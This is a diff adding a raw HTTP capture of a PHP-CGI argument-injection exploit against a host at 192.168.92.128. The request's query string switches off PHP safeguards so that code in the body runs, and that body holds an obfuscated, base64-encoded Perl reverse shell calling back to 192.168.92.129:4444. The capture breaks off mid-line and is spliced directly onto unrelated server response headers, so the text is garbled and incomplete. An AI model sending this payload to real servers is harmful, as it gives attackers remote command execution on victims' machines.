@@ -1,0 +1,15 @@
+POST /?--define+allow_url_include%3doN+--define+safe_mode%3doff+--define+suhosin.simulation%3d1+-d+disable_functions%3d%22%22+-%64+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+-%64+cgi.force_redirect%3dFaLSe+-d+cgi.redirect_status_env%3d0+--no-php-ini HTTP/1.1
+Host: 192.168.92.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 587
+
+  $c = base64_decode('cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjkyLjEyOTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==');      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {        $c=$c." 2>&1\n";      }      $uGcQJl='is_callable';      $S
+Date: Fri, 26 Jul 2024 12:00:29 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Last-Modified: Mon, 29 Apr 2024 11:40:57 GMT
+ETag: "2aa6-6173aba0dba49"
+Accept-Ranges: bytes
+Content-Length: 10918
+Vary: Accept-Encoding
+Content-Type: text/html
